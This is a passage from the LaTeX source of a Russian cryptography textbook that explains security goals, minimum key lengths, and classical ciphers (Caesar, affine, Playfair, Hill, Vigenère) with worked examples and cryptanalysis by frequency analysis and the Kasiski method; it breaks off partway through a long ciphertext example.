%$(Y_{1},X_{1}),(Y_{2}X_{2}),\ldots (Y_{m}X_{m})$ и пытается дешифровать остальной текст или определить алгоритм шифрования или определить ключ.
%\item
%\item
%\item
%\end{itemize}

Для защиты информации от активного криптоаналитика и обеспечения целостности дополнительно к шифрованию сообщений применяют имитовставку\index{имитовставка}. Для неё используют обозначение $\MAC$ (\langen{message authentication code}). Как правило, $\MAC$ строится на основе хэш-функций, которые будут описаны далее.

Существуют ситуации, когда пользователи $A$ и $B$ не доверяют друг другу. Например, $A$ -- банк, $B$ -- получатель денег. $A$ утверждает, что деньги переведены, $B$ утверждает, что не переведены. Решение задачи аутентификации и неотрицаемости состоит в обеспечении \emph{электронной подписью}\index{электронная подпись} каждого из абонентов. Предварительно надо решить задачу о генерировании и распределении секретных ключей.

В общем случае системы защиты информации должны обеспечивать:
\begin{itemize}
    \item конфиденциальность (защита от наблюдения),
    \item целостность (защита от изменения),
    \item аутентификацию (защита от фальсификации пользователя и сообщений),
    \item доказательство авторства информации (доказательство авторства и защита от его отрицания)
\end{itemize}
как со стороны получателя, так и со стороны отправителя.

Важным критерием для выбора степени защиты является сравнение стоимости реализации взлома для получения информации и экономического эффекта от владения ею. Очевидно, что если стоимость взлома превышает ценность информации, взлом нецелесообразен.

%Сценарии защиты информации
%   Сценарий 1. A -- передающая сторона. B -- принимающая сторона. E -- пассивный
%криптоаналитик, который может подслушивать передачу, но не может вмешиваться
%в процесс передачи. Цель защиты: обеспечение конфиденциальности. Средства
%-- методы шифрования с секретным ключом (симметричные системы шифрования)
%и методы шифрования с открытым ключом (асимметричные системы шифрования).
%Сценарий 2. E -- активный криптоаналитик, который может изменять, удалять и вставлять
%сообщения или их части. Цель защиты -- обеспечение конфиденциальности (не
%всегда) и обеспечение целостности. Средства -- методы шифрования и добавление
%имитовставки\index{имитовставка} (Message Autentication Code -- $\MAC$).
%Сценарий 3. A и B не доверяют друг другу. Цель защиты -- аутентификация пользователя.
%Средства -- электронная подпись.


\section{Минимальные длины ключей}
\selectlanguage{russian}

Оценим минимальную битовую длину ключа, необходимую для обеспечения криптостойкости, то есть защиты криптосистемы от атаки полным перебором всех возможных секретных ключей. Сделаем такие предположения:

\begin{itemize}
    \item одно ядро процессора выполняет $R = 10^7 \approx 2^{23}$ шифрований и расшифрований в секунду;
    \item вычислительная сеть состоит из $n = 10^3 \approx 2^{10}$ узлов;
    \item в каждом узле имеется $C = 16 = 2^4$ ядер процессора;
    \item нужно обеспечить защиту данных на $Y = 100$ лет, то есть на $S \approx 2^{32}$ с;
    \item выполняется закон Мура об удвоении вычислительной производительности на единицу стоимости каждые 2 года, то есть производительность вырастет в $M = 2^{Y/2} \approx 2^{50}$ раз.
\end{itemize}

Число переборов $N$ примерно равно
    \[ N \approx R \cdot n \cdot C \cdot S \cdot M, \]
    \[ N \approx 2^{23} \cdot 2^{10} \cdot 2^{4} \cdot 2^{32} \cdot 2^{50} = 2^{23+10+4+32+50} = 2^{119}. \]

Следовательно, минимально допустимая длина ключа для защиты от атаки перебором на 100 лет составляет порядка
    \[ \log_2 N \approx 119\text{ бит}. \]

Например, предыдущий американский стандарт шифрования DES с 56-битовым секретным ключом был впервые взломан в 1997 году перебором секретных ключей интернет-сетью из 78~000 частных компьютеров, производивших фоновые вычисления по проекту \textsc{DesChal}.



\chapter{Классические шифры}

В главе приведены наиболее известные \emph{классические} шифры, которыми можно было пользоваться до появления роторных машин. К ним относятся такие шифры, как шифр Цезаря\index{шифр!Цезаря}, шифр Плейфера\index{шифр!Плейфера}, шифр Хилла\index{шифр!Хилла} и шифр Виженера\index{шифр!Виженера}. Они наглядно демонстрируют различные классы шифров.

\section{Моноалфавитные шифры}\label{section-substitution-cipher}\index{шифр!моноалфавитный|(}
\selectlanguage{russian}

Преобразования открытого текста в шифртекст могут быть описаны различными функциями. Если функция преобразования является аддитивной, то и соответствующий шифр называется \emph{аддитивным}. Если это преобразование является аффинным, то шифр называется \emph{аффинным}.

\subsection{Шифр Цезаря}\label{section-caesar-cipher}\index{шифр!Цезаря}

Известным примером простого шифра замены является \emph{шифр Цезаря}. Процедура шифрования состоит в следующем (рис.~\ref{fig:caesar}). Записывают все буквы латинского алфавита в стандартном порядке:
    \[ A B C D E \dots Z. \]
Делают циклический сдвиг влево, например на три буквы, и записывают все буквы во втором ряду, начиная с четвёртой буквы $D$. Буквы первого ряда заменяют соответствующими (как показано стрелкой на рисунке) буквами второго ряда. После такой замены слова не распознаются теми, кто не знает ключа. Ключом $K$ является первый символ сдвинутого алфавита.

\begin{figure}[thb]
\[ \begin{array}{ccccccccccc}
    \text{A} & \text{B} & \text{C} & \text{D} & \text{E} & & \text{V} & \text{W} & \text{X} & \text{Y} & \text{Z} \\
    \downarrow & \downarrow & \downarrow & \downarrow & \downarrow & \dots & \downarrow & \downarrow & \downarrow & \downarrow & \downarrow \\
    \text{D} & \text{E} & \text{F} & \text{G} & \text{H} & & \text{Y} & \text{Z} & \text{A} & \text{B} & \text{C} \\
\end{array} \]
	\caption{Шифр Цезаря\index{шифр!Цезаря}}
	\label{fig:caesar}
\end{figure}

\example
В русском языке сообщение \texttt{изучайтекриптографию} посредством шифрования с ключом $K = \text{\texttt{г}}$ (сдвиг вправо на 3 символа по алфавиту) преобразуется в \texttt{лкцъгмхзнултхсёугчлб}.
\exampleend

Недостатком любого шифра замены является то, что в шифрованном тексте сохраняются все частоты появления букв открытого текста и корреляционные связи между буквами. Они существуют в каждом языке. Например, в русском языке чаще всего встречаются буквы $A$ и $O$. Для дешифрования криптоаналитик имеет возможность прочитать открытый текст, используя частотный анализ букв шифртекста. Для <<взлома>> шифра Цезаря достаточно найти одну пару букв -- одну замену.

\subsection{Аддитивный шифр перестановки}\index{шифр!перестановки аддитивный}

Рисунок~\ref{fig:caesar-additiv} поясняет \emph{аддитивный шифр} перестановки на алфавите. Все 26 букв латинского алфавита нумеруют по порядку от 0 до 25. Затем номер буквы меняют в соответствии с уравнением:
    \[ y = x + b \mod 26, \]
где $x$ -- прежний номер, $y$ -- новый номер, $b$ -- заданное целое число, определяющее сдвиг номера и известное только легальным пользователям. Очевидно, что шифр Цезаря является примером аддитивного шифра.

\begin{figure}[thb]
\[ \begin{array}{ccccccccccc}
    \text{A} & \text{B} & \text{C} & \text{D} & \text{E} & & \text{V} & \text{W} & \text{X} & \text{Y} & \text{Z} \\
    \downarrow & \downarrow & \downarrow & \downarrow & \downarrow & \dots & \downarrow & \downarrow & \downarrow & \downarrow & \downarrow \\
    0 & 1 & 2 & 3 & 4 & & 21 & 22 & 23 & 24 & 25 \\
    \downarrow & \downarrow & \downarrow & \downarrow & \downarrow & \dots & \downarrow & \downarrow & \downarrow & \downarrow & \downarrow \\
    3 & 4 & 5 & 6 & 7 & & 24 & 25 & 0 & 1 & 2 \\
    \downarrow & \downarrow & \downarrow & \downarrow & \downarrow & \dots & \downarrow & \downarrow & \downarrow & \downarrow & \downarrow \\
    \text{D} & \text{E} & \text{F} & \text{G} & \text{H} & & \text{Y} & \text{Z} & \text{A} & \text{B} & \text{C} \\
\end{array} \]
	\caption{Шифр Цезаря\index{шифр!Цезаря} как пример аддитивного шифра\index{шифр!перестановки аддитивный}}
	\label{fig:caesar-additiv}
\end{figure}

\subsection{Аффинный шифр}\label{section-affine-cipher}\index{шифр!афинный}

Аддитивный шифр является частным случаем \emph{аффинного шифра}. Правило шифрования сообщения имеет вид
    \[ y = a x + b \mod n. \]
Здесь производится умножение номера символа $x$ из алфавита, $x\in \set\{ 0, 1, 2, \dots, N \leq n-1 \}$, на заданное целое число $a$ и сложение с числом $b$ по модулю целого числа $n$. Ключом является $K = (a, b)$.

Расшифрование осуществляется по формуле
    \[ x = (y - b) a^{-1} \mod n. \]

Чтобы обеспечить обратимость в этом шифре, должен существовать единственный обратный элемент $a^{-1}$ по модулю $n$. Для этого должно выполняться условие $\gcd(a,n) = 1$, то есть $a$ и $n$ должны быть взаимно простыми числами ($\gcd$ -- обозначение термина с английского greatest common divisor -- наибольший общий делитель, $\text{НОД}$). Очевидно, что для <<взлома>> такого шифра достаточно найти две пары букв -- две замены.

\index{шифр!моноалфавитный|)}


\section{Биграммные шифры замены}\index{шифр!биграммный}
\selectlanguage{russian}

Если при шифровании преобразуются по две буквы открытого текста, то такой шифр называется \emph{биграммным}\index{шифр!биграммный} шифром замены. Первый биграммный шифр был изобретён аббатом Иоганном Тритемием и опубликован в 1508-ом году. Другой биграммный шифр изобретён в 1854 году Чарльзом Витстоном. Лорд Лайон Плейфер (\langen{Lyon Playfair}) внедрил этот шифр в государственных службах Великобритании, и шифр был назван шифром Плейфера\index{шифр!Плейфера}.

Опишем шифр Плейфера\index{шифр!Плейфера}. Составляется таблица для английского алфавита (буквы \texttt{I}, \texttt{J} отождествляются), в которую заносятся буквы перемешанного алфавита, например, в виде таблицы, представленной ниже. Часто перемешивание алфавита реализуется с помощью начального слова, в котором отбрасываются повторяющиеся символы. В нашем примере начальное слово \texttt{playfair}. Таблица имеет вид:

\begin{center}
    \begin{tabular}{ccccc}
        p & l & a & y & f  \\
        i & r & b & c & d  \\
        e & g & h & k & m  \\
        n & o & q & s & t  \\
        u & v & w & x & z.  \\
    \end{tabular}
\end{center}

Буквы открытого текста разбиваются на пары. Правила шифрования каждой пары состоят в следующем.

\begin{itemize}
    \item Если буквы пары не лежат в одной строке или в одном столбце таблицы, то они заменяются буквами, образующими с исходными буквами вершины прямоугольника. Первой букве пары соответствует буква таблицы, находящаяся в том же столбце. Пара букв открытого текста \texttt{we} заменяется двумя буквами таблицы \texttt{hu}. Пара букв открытого текста \texttt{ew} заменяется двумя буквами таблицы \texttt{uh}.
    \item Если буквы пары открытого текста расположены в одной строке таблицы, то каждая буква заменяется соседней справа буквой таблицы. Например, пара \texttt{gk} заменяется двумя буквами \texttt{hm}. Если одна из этих букв -- крайняя правая в таблице, то её <<правым соседом>> считается крайняя левая в этой строке. Так, пара \texttt{to} заменяется буквами \texttt{nq}.
    \item Если буквы пары лежат в одном столбце, то каждая буква заменяется соседней буквой снизу. Например, пара \texttt{lo} заменяется парой \texttt{rv}. Если одна из этих букв крайняя нижняя, то её <<нижним соседом>> считается крайняя верхняя буква в этом столбце таблицы. Например, пара \texttt{kx} заменяется буквами \texttt{sy}.
    \item Если буквы в паре одинаковые, то между ними вставляется определённая буква, называемая <<буквой-пустышкой>>. После этого разбиение на пары производится заново.
\end{itemize}

\example
Используем шифр Плейфера\index{шифр!Плейфера} и зашифруем сообщение "\texttt{Wheatstone was the inventor}". Исходное сообщение, разбитое на биграммы, показано в первой строке таблицы. Результат шифрования, также разбитый на биграммы, приведён во второй строке.
\begin{center} \begin{tabular}{|*{12}c|}
    \hline
    wh & ea & ts & to & ne & wa & st & he & in & ve & nt & or \\
    \hline
    aq & ph & nt & nq & un & ab & tn & kg & eu & gu & on & vg \\
    \hline
\end{tabular} \end{center}
\exampleend

Шифр Плейфера\index{шифр!Плейфера} не является криптографически стойким. Несложно найти ключ, если известны пара открытого текста и соответствующего ему шифртекста. Если известен только шифртекст, криптоаналитик может проанализировать соответствие между частотой появления биграмм в шифртексте и известной частотой появления биграмм в языке, на котором написано сообщение. Такой частотный анализ помогает дешифрованию.


\section{Полиграммный шифр замены Хилла}\index{шифр!Хилла|(}
\selectlanguage{russian}

Если при шифровании преобразуются более двух букв открытого текста, то шифр называется \emph{полиграммным}\index{шифр!полиграммный}. Первый полиграммный шифр предложил Лестер Хилл в 1929 году (\langen{Lester Sanders Hill}, \cite{Hill:1929, Hill:1931}). Это был первый шифр, который позволял оперировать более чем тремя символами за один такт.

В шифре Хилла текст предварительно преобразуют в цифровую форму и разбивают на последовательности (блоки) по $n$ последовательных цифр. Такие последовательности называются \emph{$n$-граммами}. Выбирают обратимую по модулю $m$  $(n \times n)$-матрицу $\mathbf{A} = (a_{ij})$, где $m$~--- число букв в алфавите. Выбирают случайный $n$-вектор $\mathbf{f} = (f_1, \dots, f_n)$. После чего $n$-грамма открытого текста $\mathbf{x} = (x_1, x_2, \dots, x_n)$ заменяется $n$-граммой шифрованного текста $\mathbf{y} = (y_1, y_2, \dots, y_n)$ по формуле:
    \[ \mathbf{y} = \mathbf{x} \mathbf{A} + \mathbf{f} \mod m. \]
Расшифрование проводится по правилу
    \[ \mathbf{x} = (\mathbf{y} - \mathbf{f}) \mathbf{A}^{-1} \mod m. \]

\example
Приведём пример шифрования с помощью шифра Хилла. Преобразуем английский алфавит в числовую форму (m = 26) следующим образом:
\[ \text{a} \rightarrow 0, ~ \text{b} \rightarrow 1, ~ \text{c} \rightarrow 2, ~ \dots, ~ \text{z} \rightarrow 25. \]
%\[ \begin{array}{cccccccccccccc}
%    a & b & c & d & e & f & g & h & i & j &  k &  l &  m &  n \\
%    0 & 1 & 2 & 3 & 4 & 5 & 6 & 7 & 8 & 9 & 10 & 11 & 12 & 13
%\end{array} \]
%\[ \begin{array}{cccccccccccc}
%     o &  p &  q &  r &  s &  t &  u &  v &  w &  x &  y &  z  \\
%    14 & 15 & 16 & 17 & 18 & 19 & 20 & 21 & 22 & 23 & 24 & 25
%\end{array} \]

Выберем для примера $n = 2$. Запишем фразу <<Wheatstone was the inventor>> из предыдущего примера (первая строка таблицы). Каждой букве поставим в соответствие её номер в алфавите (вторая строка):
\begin{center} \resizebox{\textwidth}{!}{ \begin{tabular}{|*{12}c|}
    \hline
    w,h & e,a & t,s & t,o & n,e & w,a & s,t & h,e & i,n & v,e & n,t & o,r \\
    \hline
    22,7 & 4,0 & 19,18 & 19,14 & 13,4 & 22,0 & 18,19 & 7,4 & 8,13 & 21,4 & 13,19 & 14,17 \\
    \hline
\end{tabular} } \end{center}

Выберем матрицу шифрования $A$ в виде
\[
    \mathbf{A} = \left( \begin{array}{cc}
        5 & 8 \\
        3 & 5 \\
    \end{array} \right).
\]

Эта матрица обратима по $\mod 26$, так как её определитель равен $1$ и взаимно прост с числом букв английского алфавита $m=26$. Обратная матрица равна
\[
    \mathbf{A}^{-1} = \left( \begin{array}{cc}
        5  & 18 \\
        23 & 5
    \end{array} \right) \mod 26.
\]

Выберем вектор $\mathbf{f} = (4, 2)$. Первая числовая пара открытого текста $\mathbf{x} = (\text{w}, \text{h}) = (22, 7)$ зашифрована в виде
\[
    \mathbf{y} = \mathbf{x} \mathbf{A} + \mathbf{f} =
        (22, 7)
        \left( \begin{array}{cc}
            5 & 8 \\
            3 & 5
        \end{array} \right) +
        (4, 2) = (14, 3) \mod 26
\]
или в буквенном виде $(\text{o}, \text{d})$.

Повторяя вычисления для всех пар, получим полный шифрованный текст в числовом виде (третья строка) или в буквенном виде (четвёртая строка):
\begin{center} \resizebox{\textwidth}{!}{ \begin{tabular}{|*{12}c|}
    \hline
    w,h & e,a & t,s & t,o & n,e & w,a & s,t & h,e & i,n & v,e & n,t & o,r \\
    22,7 & 4,0 & 19,18 & 19,14 & 13,4 & 22,0 & 18,19 & 7,4 & 8,13 & 21,4 & 13,19 & 14,17 \\
    \hline
    14,3 & 24,22 & 9,21 & 3,9 & 23,1 & 10,8 & 12,19 & 19,23 & 18,3 & 11,15 & 13,20 & 2,19 \\
    o,d & y,w & j,v & d,j & x,b & k,i & m,t & t,x & s,d & l,p & n,u & c,t \\
    \hline
\end{tabular} } \end{center}
\exampleend

Криптосистема Хилла уязвима к частотному криптоанализу\index{криптоанализ!частотный}, который основан на вычислении частот последовательностей символов. Рассмотрим пример <<взлома>> простого варианта криптосистемы Хилла.

\example В английском языке $m = 26$,
    \[ a \rightarrow 0, ~ b \rightarrow 1, ~ \dots, ~ z \rightarrow 25. \]
При шифровании использована криптосистема Хилла с матрицей второго порядка c нулевым вектором $\mathbf{f}$. Наиболее часто встречающиеся в шифротексте биграммы -- RH и NI, в то время как в исходном языке -- TH и HE (артикль THE). Найдём матрицу секретного ключа, составив уравнения
\[
    \begin{array}{l}
        R = 17 = -9 \mod 26, ~~ H = 7 \mod 26, ~~ N = 13 \mod 26, \\
        I = 8 \mod 26, ~~ T = 19 = -7 \mod 26, ~~ E=4 \mod 26; \\
    \end{array}
\] \[
    \left( \begin{array}{cc}
        \text{R} & \text{H} \\
        \text{N} & \text{I}
    \end{array} \right) =
    \left( \begin{array}{cc}
        \text{T} & \text{H} \\
        \text{H} & \text{E}
    \end{array} \right) \cdot
    \left( \begin{array}{cc}
        k_{1,1} & k_{1,2} \\
        k_{2,1} & k_{2,2}
    \end{array} \right) \mod 26;
\] \[
    \left( \begin{array}{cc}
        -9 & 7 \\
        13 & 8
    \end{array} \right) =
    \left( \begin{array}{cc}
        -7 & 7 \\
        7 & 4
    \end{array} \right) \cdot
    \left( \begin{array}{cc}
        k_{1,1} & k_{1,2} \\
        k_{2,1} & k_{2,2}
    \end{array} \right) \mod 26.
\]

Стоит обратить внимание на то, что числа 4, 8, 13 не имеют обратных по модулю 26.

\[
    D = \det \left( \begin{array}{cc} -7 & 7 \\ 7 & 4 \end{array} \right) = -7 \cdot 4 - 7 \cdot 7 = 1 \mod 26.
\] \[
    \left( \begin{array}{cc} -7 & 7 \\ 7 & 4 \end{array} \right)^{-1} =
    D^{-1} \left( \begin{array}{cc} 4 & -7 \\ -7 & -7 \end{array} \right) =
    \left( \begin{array}{cc} 4 & -7 \\ -7 & -7 \end{array} \right) \mod 26.
\] \[
    \left( \begin{array}{cc} k_{1,1} & k_{1,2} \\ k_{2,1} & k_{2,2} \end{array} \right) =
    \left( \begin{array}{cc} 4 & -7 \\ -7 & -7 \end{array} \right) \cdot
    \left( \begin{array}{cc} -9 & 7 \\ 13 & 8 \end{array} \right) =
\] \[
    = \left( \begin{array}{cc} 3 & -2 \\ -2 & -1 \end{array} \right) \mod 26.
\]
Найденный секретный ключ
\[
    \left( \begin{array}{cc} \text{D} & \text{Y} \\ \text{Y} & \text{Z} \end{array} \right).
\]
\exampleend

\index{шифр!Хилла|)}


% \subsection{Омофонные замены}
%
% Омофонными заменами называют криптопримитивы, в основе которых лежит замена групп символов открытого текста $M$ на группу символов $C$ с использованием ключа $K$. Такой метод шифрования вносит неоднозначность между $M$ и $C$, это позволяет защититься от методов частотного криптоанализа.
%  \subsection{шифрокоды}
%  Шифрокоды -- это класс шифров сочетающих в себе свойства кодов и помехозащищённости со свойствами шифра и обеспечения конфиденциальности.

\section{Шифр гаммирования Виженера}
\selectlanguage{russian}

Шифр, который известен под именем Виженера, впервые описал Джованни Баттиста Беллазо (\langit{Giovanni Battista Bellaso}) в своей книге \foreignlanguage{italian}{``La cifra del Sig. Giovan Battista Belaso''}.

Рассмотрим один из вариантов этого шифра. В самом простом случае квадратом \textbf{Виженера} называется таблица из циклически сдвинутых копий латинского алфавита, в котором буквы J и V исключены. Первая строка и первый столбец~-- буквы латинского алфавита в их обычном порядке, кроме буквы W, которая стоит последней. В строках таблицы порядок букв сохраняется, за исключением циклических переносов. Представим эту таблицу.

\begin{center} \resizebox{\textwidth}{!}{ \begin{tabular}{|c|*{24}c|}
    \hline
    $\quad \downarrow ~ \rightarrow$ & \textbf{A} & \textbf{B} & \textbf{C} & \textbf{D} & \textbf{E} & \textbf{F} & \textbf{G} & \textbf{H} & \textbf{I} & \textbf{K} & \textbf{L} & \textbf{M} & \textbf{N} & \textbf{O} & \textbf{P} & \textbf{Q} & \textbf{R} & \textbf{S} & \textbf{T} & \textbf{U} & \textbf{X} & \textbf{Y} & \textbf{Z} & \textbf{W} \\
    \hline
    \textbf{A} & A & B & C & D & E & F & G & H & I & K & L & M & N & O & P & Q & R & S & T & U & X & Y & Z & W \\
    \textbf{B} & B & C & D & E & F & G & H & I & K & L & M & N & O & P & Q & R & S & T & U & X & Y & Z & W & A \\
    \textbf{C} & C & D & E & F & G & H & I & K & L & M & N & O & P & Q & R & S & T & U & X & Y & Z & W & A & B \\
    \textbf{D} & D & E & F & G & H & I & K & L & M & N & O & P & Q & R & S & T & U & X & Y & Z & W & A & B & C \\
    \textbf{E} & E & F & G & H & I & K & L & M & N & O & P & Q & R & S & T & U & X & Y & Z & W & A & B & C & D \\
    \textbf{F} & F & G & H & I & K & L & M & N & O & P & Q & R & S & T & U & X & Y & Z & W & A & B & C & D & E \\
    \textbf{G} & G & H & I & K & L & M & N & O & P & Q & R & S & T & U & X & Y & Z & W & A & B & C & D & E & F \\
    \textbf{H} & H & I & K & L & M & N & O & P & Q & R & S & T & U & X & Y & Z & W & A & B & C & D & E & F & G \\
    \textbf{I} & I & K & L & M & N & O & P & Q & R & S & T & U & X & Y & Z & W & A & B & C & D & E & F & G & H \\
    \textbf{K} & K & L & M & N & O & P & Q & R & S & T & U & X & Y & Z & W & A & B & C & D & E & F & G & H & I \\
    \textbf{L} & L & M & N & O & P & Q & R & S & T & U & X & Y & Z & W & A & B & C & D & E & F & G & H & I & K \\
    \textbf{M} & M & N & O & P & Q & R & S & T & U & X & Y & Z & W & A & B & C & D & E & F & G & H & I & K & L \\
    \textbf{N} & N & O & P & Q & R & S & T & U & X & Y & Z & W & A & B & C & D & E & F & G & H & I & K & L & M \\
    \textbf{O} & O & P & Q & R & S & T & U & X & Y & Z & W & A & B & C & D & E & F & G & H & I & K & L & M & N \\
    \textbf{P} & P & Q & R & S & T & U & X & Y & Z & W & A & B & C & D & E & F & G & H & I & K & L & M & N & O \\
    \textbf{Q} & Q & R & S & T & U & X & Y & Z & W & A & B & C & D & E & F & G & H & I & K & L & M & N & O & P \\
    \textbf{R} & R & S & T & U & X & Y & Z & W & A & B & C & D & E & F & G & H & I & K & L & M & N & O & P & Q \\
    \textbf{S} & S & T & U & X & Y & Z & W & A & B & C & D & E & F & G & H & I & K & L & M & N & O & P & Q & R \\
    \textbf{T} & T & U & X & Y & Z & W & A & B & C & D & E & F & G & H & I & K & L & M & N & O & P & Q & R & S \\
    \textbf{U} & U & X & Y & Z & W & A & B & C & D & E & F & G & H & I & K & L & M & N & O & P & Q & R & S & T \\
    \textbf{X} & X & Y & Z & W & A & B & C & D & E & F & G & H & I & K & L & M & N & O & P & Q & R & S & T & U \\
    \textbf{Y} & Y & Z & W & A & B & C & D & E & F & G & H & I & K & L & M & N & O & P & Q & R & S & T & U & X \\
    \textbf{Z} & Z & W & A & B & C & D & E & F & G & H & I & K & L & M & N & O & P & Q & R & S & T & U & X & Y \\
    \textbf{W} & W & A & B & C & D & E & F & G & H & I & K & L & M & N & O & P & Q & R & S & T & U & X & Y & Z \\
    \hline
\end{tabular} } \end{center}

Здесь первый столбец используется для ключевой последовательности, а первая строка~-- для открытого текста. Общая схема шифрования такова: выбирается некоторая ключевая последовательность, которая периодически повторяется в виде длинной строки. Под ней соответственно каждой букве записываются буквы открытого текста в виде второй строки. Буква ключевой последовательности указывает строку в квадрате Виженера, буква открытого текста указывает столбец в квадрате. Соответствующая буква, стоящая в квадрате на пересечении строки и столбца, заменяет букву открытого текста в шифртексте. Приведём примеры.

\example
Ключевая последовательность состоит из периодически повторяющегося ключевого слова, известного обеим сторонам. Пусть ключевая последовательность состоит из периодически повторяющегося слова THIS, а открытый текст~-- слова COMMUNICATIONSYSTEMS (см. таблицу). Пробелы между словами опущены.
\begin{center} \resizebox{\textwidth}{!}{ \begin{tabular}{|l|*{20}c|}
    \hline
    Ключ            & T & H & I & S & T & H & I & S & T & H & I & S & T & H & I & S & T & H & I & S \\
    Открытый текст  & C & O & M & M & U & N & I & C & A & T & I & O & N & S & Y & S & T & E & M & S \\
    Шифртекст      & X & X & U & E & O & U & R & U & T & B & R & G & G & A & F & L & N & M & U & L \\
    \hline
\end{tabular} } \end{center}
Результат шифрования приведён в третьей строке: на пересечении строки $T$ и столбца $C$ стоит буква $X$, на пересечении строки $H$ и столбца $O$ стоит буква $X$, на пересечении строки $I$ и столбца $M$ стоит буква $U$ и~т.\,д.
\exampleend

Виженер считал возможным в качестве ключевой последовательности использовать открытый текст с добавлением начальной буквы, известной легальным пользователям. Этот вариант используется во втором примере.

\example
Ключевая последовательность образуется с помощью открытого текста. Стороны договариваются о первой букве ключа, а следующие буквы состоят из открытого текста. Пусть в качестве первой буквы выбрана буква $T$. Тогда для предыдущего примера таблица шифрования имеет вид:
\begin{center} \resizebox{\textwidth}{!}{ \begin{tabular}{|l|*{20}c|}
    \hline
    Ключ            & T & C & O & M & M & U & N & I & C & A & T & I & O & N & S & Y & S & T & E & M \\
    Открытый текст  & C & O & M & M & U & N & I & C & A & T & I & O & N & S & Y & S & T & E & M & S \\
    Шифртекст      & X & Q & A & Z & G & H & X & L & C & T & C & Y & B & F & P & P & M & Z & Q & E \\
    \hline
\end{tabular} } \end{center}
\exampleend

\example 
Пусть ключевая последовательность образуется с помощью шифртекста. Стороны договариваются о первой букве ключа. В отличие от предыдущего случая, следующая буква ключа~-- это результат шифрования первой буквы текста и~т.\,д. Пусть в качестве первой буквы выбрана буква $T$. Тогда приведённая в предыдущем примере таблица шифрования примет такой вид:
\begin{center} \resizebox{\textwidth}{!}{ \begin{tabular}{|l|*{20}c|}
    \hline
    Ключ            & T & X & K & X & H & C & P & Z & A & A & T & C & Q & D & X & S & L & E & I & U \\
    Открытый текст  & C & O & M & M & U & N & I & C & A & T & I & O & N & S & Y & S & T & E & M & S \\
    Шифртекст      & X & K & X & H & C & P & Z & A & A & T & C & Q & D & X & S & L & E & I & U & N \\
    \hline
\end{tabular} } \end{center}
\exampleend


\section[Криптоанализ полиалфавитных шифров]{Криптоанализ полиалфавитных \protect\\ шифров}
\selectlanguage{russian}

При дешифровании полиалфавитных шифров криптоаналитику необходимо сначала определить период, для предполагаемого периода преобразовать шифрограмму в матрицу, затем использовать для каждого столбца матрицы методы криптоанализа моноалфавитных шифров. В случае неудачи необходимо изменить предполагаемый период.

Известно несколько методов криптоанализа для нахождения периода. Из них наиболее популярными являются метод Касиски, автокорреляционный метод и метод индекса совпадений.


\subsection{Метод Касиски}

Метод Касиски (\langde{Friedrich Wilhelm Kasiski}, 1805--1881, \cite{Kasiski:1863}) состоит в том, что в шифротексте находят одинаковые сегменты длиной не менее трёх символов и вычисляют расстояние между начальными символами последовательных сегментов. Далее находят наибольший общий делитель этих расстояний. Считается, что предполагаемый период $n$ является кратным этому значению. Обычно нахождение периода осуществляется в несколько этапов.

После того как выбирается наиболее правдоподобное значение периода, криптоаналитик переходит к дешифрованию. Приведём пример использования метода Касиски.

\example
Пусть шифруется следующий текст без учёта знаков препинания и различия строчных и прописных букв. Пробелы оставлены в тексте для удобства чтения, хотя при шифровании пробелы были опущены.

\begin{quote}
    \noindent \texttt{Игры различаются по содержанию характерным особенностям а также по тому какое место они занимают в жизни детей их воспитании и обучении. Каждый отдельный вид игры имеет многочисленные варианты Дети очень изобретательны Они усложняют и упрощают известные игры придумывают новые правила и детали Например сюжетно ролевые игры создаются самими детьми но при некотором руководстве воспитателя Их основой является самодеятельность Такие игры иногда называют творческими сюжетно ролевыми играми Разновидностью сюжетно ролевой игры являются строительные игры и игры драматизации В практике воспитания нашли свое место и игры с правилами которые создаются для детей взрослыми К ним относятся дидактические подвижные и игры забавы В основе их лежит четко определенное программное содержание дидактические задачи и целенаправленное обучение Для хорошо организованной жизни детей в детском саду необходимо разнообразие игр так как только при этих условиях будет обеспечена детям возможность интересной и содержательной деятельности Многообразие типов видов форм игр неизбежно как неизбежно многообразие жизни которую они отражают как неизбежно многообразие несмотря на внешнюю схожесть игр одного типа модели}
\end{quote}

Для шифрования выберем период $n=4$ и следующие 4 моноалфавитных шифра замены:

\begin{center} \begin{tabular}{|lcl|}
    \hline
    абвгдежзийклмнопрстуфхцчшщъыьэюя & -- & алфавит \\
    йклмнопрстуфхцчшщъыьэюяабвгдежзи & -- & 1-й шифр \\
    гаэъчфсолиевяьщцурнкздбюышхтпмйж & -- & 2-й шифр \\
    бфзънаужщмятешлюсдчкэргцйьпвхиыо & -- & 3-й шифр \\
    пъерыжсьзтэиуюйфякхалцбмчвншгощд & -- & 4-й шифр \\
    \hline
\end{tabular} \end{center}

Тогда шифрованный текст примет следующий вид (в шифротексте пробелов нет, они вставлены для удобства чтения):

\begin{quote}
\noindent \texttt{съсш щгжисюбщыро фч рлыоуупцлы цйубэыфсюдя лкчааюцщдхия б хйеуж шщ чйхк япуща уорчй чьщьйьщуййч еплжюсчахоищцлщдфснбюсл щ йккцжцлщ эйсншт щчыовхюди ззн лъяд лежон еючълмсртжцьвж лгсзйьчш нфчз чюаюе лжйкуахйнаиеьв йцл ккфщуюийч з ьцсйвгых созжъншшо лъяд цсзнкешлгых цщзшо цспллтп с чахйвщ юйцсзхфс кзсахцщ сйффзшо лъяд рльнгыхъж дпхлез нфчгхл шй шущ юоелхчулу щкяйлщнкыэа ечрюзыгчжфж щц чршйлщм длвожыро кйялыожчжфпшйънх хйещж съсш сьлрнг шпртзпзн чечуцжъещус рысоншй щщтжлтез съспхл спрьлесчшйънхщ ъйужыьл ячваечи щрщт оефжыхъж дхщщщховхюдф щрщт щ змув ыщгепылжпялщ е шубэыляж лщдфснбюсж шпбвщ клща уорчй с лъяд р юяйэщийящ эчнлядф дйрчбщыро ыфжнжыфмерулкфтез у ьщу чншйъжчки чщыйечзафдэсф юйнэщсцта з съсш ргфплт з йъьлео лр иосщх афчэч щюяочаиоьшйо цсймубухьлжъщнжщсбюсфнзнгяхсюакула ьйчбмс лгжффшпшубеффшючф лъьюаюсф нии длячыл йщъбюсолейьшйт сщьцл нжыфм е нфчкуще кйчк юощфцччщуч убьцщлъщгжзо лъя ыгя эйе чйфпяй шущоылр аъвлесжр ъьчах чаакшфцжцг нжыже ечоейпьлкып щюыфсжъьлтс рлыоуупыфтгцщм ыожчжфпшйънщуцщъйчаспрла хсцле ллнйл злях лъя цфщькфуюч ебэ цфщькфуючяшймщлъщгжзо сщьцл яйыщсазщшз чнсппгых угяюолжъосшй хьлрчщфяйощжцфдучнсд цгзюоышщзррйпфдхе лъя 